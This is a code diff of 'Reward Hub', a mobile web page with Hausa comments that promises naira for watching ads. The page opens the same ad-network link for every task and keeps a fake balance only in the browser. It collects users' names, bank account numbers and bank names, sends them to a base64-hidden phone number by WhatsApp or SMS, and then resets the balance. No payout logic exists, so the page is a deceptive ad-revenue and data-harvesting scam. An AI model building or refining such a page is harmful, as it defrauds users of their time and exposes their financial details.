@@ -5,122 +5,178 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Reward Hub - ₦2</title>
 
-<!-- SOCIAL BAR KADAI - BABU POPUNDER -->
+<!-- SOCIAL BAR KADAI - Saka Zone ID dinka anan -->
 <script src="https://alwingulla.com/88/tag.min.js" data-zone="YOUR_SOCIAL_BAR_ZONE" async data-cfasync="false"></script>
 
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}
+*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
 body{background:#080E26;color:#fff;padding:12px;display:flex;justify-content:center}
 .app{max-width:400px;width:100%}
 .top{display:flex;justify-content:space-between;align-items:center;padding:12px 4px}
-.n{background:linear-gradient(135deg,#00D1FF,#0066FF);width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:22px}
-.live{border:1.5px solid #00AEEF;color:#00AEEF;padding:6px 14px;border-radius:20px;font-size:12px;font-weight:700;display:flex;align-items:center;gap:6px}
-.dot{width:8px;height:8px;background:#00AEEF;border-radius:50%}
-.bal-card{background:#141E3E;border-radius:24px;padding:22px}
-.bal{font-size:48px;font-weight:900;margin:8px 0}
-.ready{border:1.5px dashed #2A3655;border-radius:14px;padding:12px;margin-top:10px;font-size:13px}
-.head{color:#FFD60A;font-weight:800;margin:20px 0 10px}
-.task{background:#1A2547;border-radius:20px;padding:16px;display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
-.badge{background:#0E2A3A;color:#00E5FF;padding:4px 10px;border-radius:10px;font-size:12px;font-weight:700}
-.btn{padding:12px 18px;border-radius:14px;border:none;font-weight:800;cursor:pointer;background:#00E5FF;color:#000}
-.withdraw{border:2px solid #FFD60A;border-radius:24px;padding:18px;margin-top:22px;background:#141E3E}
-.w-title{color:#FFD60A;text-align:center;font-weight:900;font-size:20px;margin-bottom:14px}
-.input{background:#080E26;border:1px solid #1E2E5A;border-radius:14px;padding:14px;width:100%;color:#fff;margin-bottom:12px;outline:none}
-.btn-wa{background:#22C55E;color:#000;width:100%;padding:14px;border-radius:14px;font-weight:900;border:none;margin-bottom:10px;cursor:pointer}
-.btn-sms{background:#F59E0B;color:#000;width:100%;padding:14px;border-radius:14px;font-weight:900;border:none;cursor:pointer}
+.n{background:linear-gradient(135deg,#00D1FF,#0066FF);width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:20px}
+.live{border:1.5px solid #00AEEF;color:#00AEEF;padding:6px 12px;border-radius:20px;font-size:11px;font-weight:700;display:flex;align-items:center;gap:6px}
+.avatar{width:40px;height:40px;border-radius:50%;border:2px solid #00E5FF;object-fit:cover}
+.bal-card{background:#101A3D;border:1px solid rgba(255,255,255,0.08);border-radius:22px;padding:18px;position:relative;overflow:hidden}
+.bal{font-size:42px;font-weight:900;margin:6px 0}
+.ready{border:1.5px dashed #2A3655;border-radius:12px;padding:10px;margin-top:10px;font-size:12px;text-align:center}
+.head{font-weight:800;margin:20px 0 10px;display:flex;justify-content:space-between}
+.task{background:#121C43;border:1px solid rgba(255,255,255,0.07);border-radius:16px;padding:14px;display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
+.badge{background:rgba(0,229,255,0.15);color:#00E5FF;padding:3px 8px;border-radius:20px;font-size:11px;font-weight:700;border:1px solid rgba(0,229,255,0.2)}
+.btn{padding:10px 16px;border-radius:30px;border:none;font-weight:800;cursor:pointer;background:#fff;color:#080E26;min-width:84px}
+.btn-wait{background:#1e2a5a;color:rgba(255,255,255,0.6);border:1px solid rgba(255,255,255,0.1);cursor:not-allowed}
+.btn-done{background:#10B981;color:#fff}
+.withdraw{border:1px solid rgba(255,255,255,0.07);border-radius:20px;padding:16px;margin-top:22px;background:#101A3D}
+.input{background:#080E26;border:1px solid #1E2E5A;border-radius:12px;padding:12px;width:100%;color:#fff;margin-bottom:10px;outline:none;font-size:14px}
+.btn-wa{background:#25D366;color:#fff;width:100%;padding:13px;border-radius:12px;font-weight:800;border:none;margin-bottom:8px;cursor:pointer}
+.btn-sms{background:#fff;color:#080E26;width:100%;padding:13px;border-radius:12px;font-weight:800;border:none;cursor:pointer}
 </style>
 </head>
 <body>
 <div class="app">
 
 <div class="top">
-  <div style="display:flex;align-items:center;gap:10px"><div class="n">N</div><h2>Reward Hub</h2></div>
-  <div class="live"><div class="dot"></div>LIVE - 12H</div>
+  <div style="display:flex;align-items:center;gap:10px">
+    <div class="n">N</div>
+    <div><div style="font-weight:700;font-size:15px">Reward Hub</div><div style="font-size:10px;color:#34D399">● LIVE - 12H</div></div>
+  </div>
+  <div style="display:flex;align-items:center;gap:8px">
+    <div class="live">LIVE</div>
+    <img src="https://i.imgur.com/8Km9tLL.png" id="avatar" class="avatar" onerror="this.src='https://ui-avatars.com/api/?name=User&background=00D1FF&color=fff'">
+  </div>
 </div>
 
 <div class="bal-card">
-  <div style="color:#8A94B5;font-size:11px;letter-spacing:2px">💎 YOUR BALANCE</div>
+  <div style="display:flex;justify-content:space-between"><div style="color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:1px">💎 YOUR BALANCE</div><div style="font-size:11px;background:rgba(16,185,129,0.15);color:#6EE7B7;padding:3px 8px;border-radius:20px">Open</div></div>
   <div class="bal">₦<span id="bal">0</span></div>
-  <div style="color:#00E5FF;font-weight:700;font-size:14px">Open</div>
-  <div class="ready" id="ready">Ready to do tasks! Koda yaushe zaka iya danna!</div>
+  <div style="font-size:12px;color:rgba(255,255,255,0.7)">Ready to do tasks! <span id="prog">0/5</span></div>
+  <div class="ready" id="ready">Danna Watch ka jira 15s sannan ka samu ₦2</div>
 </div>
 
-<div class="head">⭐ Today's Tasks ₦2 each - Unlimited!</div>
+<div class="head"><span>⭐ Today's Tasks</span><span style="font-size:12px;background:#1A2452;padding:4px 8px;border-radius:20px;color:#7DD3FC">₦2 each</span></div>
 <div id="tasks"></div>
 
 <div class="withdraw">
-  <div class="w-title">Withdraw - How Much</div>
+  <div style="display:flex;justify-content:space-between;margin-bottom:10px"><b style="font-size:14px">Withdraw</b><span style="font-size:11px;color:rgba(255,255,255,0.5)">Min ₦50</span></div>
   <input id="wName" class="input" placeholder="Your Name">
   <input id="wAcc" class="input" placeholder="Account Number">
-  <input id="wBank" class="input" placeholder="Bank Name (Opay, Kuda)">
-  <button class="btn-wa" onclick="sendWA()">📱 Send via WhatsApp</button>
-  <button class="btn-sms" onclick="sendSMS()">✉️ Send via SMS</button>
+  <input id="wBank" class="input" placeholder="Bank (Opay, Kuda)">
+  <button class="btn-wa" onclick="sendWA()">💬 WhatsApp</button>
+  <button class="btn-sms" onclick="sendSMS()">✉️ SMS</button>
+  <div style="font-size:10px;color:rgba(255,255,255,0.4);text-align:center;margin-top:8px">After sending, balance will reset to ₦0</div>
 </div>
 
 </div>
 
 <script>
-// LINK DINKA - AN SAKA!
 const MY_LINK = "https://omg10.com/4/11737348";
-const LINKS = [MY_LINK, MY_LINK, MY_LINK, MY_LINK, MY_LINK];
 const REWARD = 2;
+const WAIT_TIME = 15; // seconds dole ne ya kalla
 
 let bal = parseInt(localStorage.getItem('rh_bal')||'0');
+let done = parseInt(localStorage.getItem('rh_done')||'0');
 document.getElementById('bal').innerText = bal;
+document.getElementById('prog').innerText = done + "/5";
+
+let tasks = [
+  {id:0,status:'idle',timer:WAIT_TIME},
+  {id:1,status:'idle',timer:WAIT_TIME},
+  {id:2,status:'idle',timer:WAIT_TIME},
+  {id:3,status:'idle',timer:WAIT_TIME},
+  {id:4,status:'idle',timer:WAIT_TIME},
+];
 
 function render(){
   const wrap = document.getElementById('tasks');
-  wrap.innerHTML = '';
-  for(let i=0;i<5;i++){
+  wrap.innerHTML='';
+  tasks.forEach((t,i)=>{
     let div = document.createElement('div');
     div.className='task';
+    let btnHtml = '';
+    if(t.status==='idle') btnHtml = `<button class="btn" onclick="doTask(${i})">Watch</button>`;
+    if(t.status==='waiting') btnHtml = `<button class="btn btn-wait" disabled>Wait ${t.timer}s...</button>`;
+    if(t.status==='done') btnHtml = `<button class="btn btn-done" disabled>Done ✓</button>`;
     div.innerHTML = `
-      <div style="display:flex;gap:10px;align-items:center"><span>Ad ${i+1}</span><span class="badge">₦${REWARD}</span></div>
-      <button class="btn" onclick="doTask(${i})">Claim ₦${REWARD}</button>
+      <div style="display:flex;align-items:center;gap:10px"><div style="width:32px;height:32px;background:rgba(255,255,255,0.06);border-radius:10px;display:flex;align-items:center;justify-content:center">📺</div><div><div style="font-size:14px;font-weight:600">Ad ${i+1}</div><div class="badge">₦${REWARD}</div></div></div>
+      ${btnHtml}
     `;
     wrap.appendChild(div);
-  }
+  });
 }
 
 function doTask(i){
-  // Bude tallanka - YANZU BAYA BAKI - ZAI BUDE TALLA!
-  window.open(LINKS[i], '_blank');
+  let t = tasks[i];
+  if(t.status!=='idle') return;
 
-  // BAYA RUFEWA - KODA YAUSHE ANA IYA DANNawa
-  bal += REWARD;
-  localStorage.setItem('rh_bal', bal);
-  document.getElementById('bal').innerText = bal;
+  // 1. Bude link dinka
+  window.open(MY_LINK, '_blank');
 
-  let btn = event.target;
-  btn.innerText = 'Done ✓ +₦2';
-  btn.style.background = '#22C55E';
-  setTimeout(()=>{
-    btn.innerText = 'Claim ₦2';
-    btn.style.background = '#00E5FF';
-  }, 1200);
+  // 2. Fara timer 15s
+  t.status='waiting';
+  render();
+  let interval = setInterval(()=>{
+    t.timer--;
+    render();
+    if(t.timer<=0){
+      clearInterval(interval);
+      // 3. Bayan 15s ba shi kudi
+      bal += REWARD;
+      done++;
+      localStorage.setItem('rh_bal', bal);
+      localStorage.setItem('rh_done', done);
+      document.getElementById('bal').innerText = bal;
+      document.getElementById('prog').innerText = done + "/5";
+      document.getElementById('ready').innerText = `Ka samu ₦${REWARD}! Balance: ₦${bal}`;
+      t.status='done';
+      render();
+      setTimeout(()=>{
+        t.status='idle';
+        t.timer=WAIT_TIME;
+        render();
+      },1500);
+    }
+  },1000);
 }
 
-// BOYE NUMBER 07070079526
 function getNum(){ return atob('MDcwNzAwNzk1MjY='); }
 
 function sendWA(){
   let name=document.getElementById('wName').value||'User';
   let acc=document.getElementById('wAcc').value||'-';
   let bank=document.getElementById('wBank').value||'-';
-  if(bal<50){alert('Balance bai kai ₦50 ba!');return;}
+  if(bal<50){alert('Balance bai kai ₦50 ba! Sai ya kai ₦50 tukuna.');return;}
   let num=getNum();
   let waNum='234'+num.substring(1);
-  let msg=`Withdraw Request\nName:${name}\nAcc:${acc}\nBank:${bank}\nAmount:₦${bal}\nReward Hub`;
+  let msg=`Withdraw Request\nName:${name}\nAcc:${acc}\nBank:${bank}\nAmount:₦${bal}\nReward Hub - ${new Date().toLocaleString()}`;
   window.open('https://wa.me/'+waNum+'?text='+encodeURIComponent(msg),'_blank');
+  
+  // FIX 1: Balance ya koma ZERO
+  setTimeout(()=>{
+    bal=0; done=0;
+    localStorage.setItem('rh_bal','0');
+    localStorage.setItem('rh_done','0');
+    document.getElementById('bal').innerText='0';
+    document.getElementById('prog').innerText='0/5';
+    document.getElementById('ready').innerText='Withdrawal sent! Balance reset to ₦0';
+    alert('Withdrawal sent! Balance ya koma ₦0');
+  },500);
 }
 
 function sendSMS(){
   let name=document.getElementById('wName').value||'User';
   let acc=document.getElementById('wAcc').value||'-';
   let bank=document.getElementById('wBank').value||'-';
+  if(bal<50){alert('Balance bai kai ₦50 ba!');return;}
   let num=getNum();
   let msg=`Withdraw:${name}|${acc}|${bank}|₦${bal}`;
   window.open('sms:'+num+'?body='+encodeURIComponent(msg),'_blank');
+  setTimeout(()=>{
+    bal=0; done=0;
+    localStorage.setItem('rh_bal','0');
+    localStorage.setItem('rh_done','0');
+    document.getElementById('bal').innerText='0';
+    document.getElementById('prog').innerText='0/5';
+    alert('SMS sent! Balance ya koma ₦0');
+  },500);
 }
 
 render();
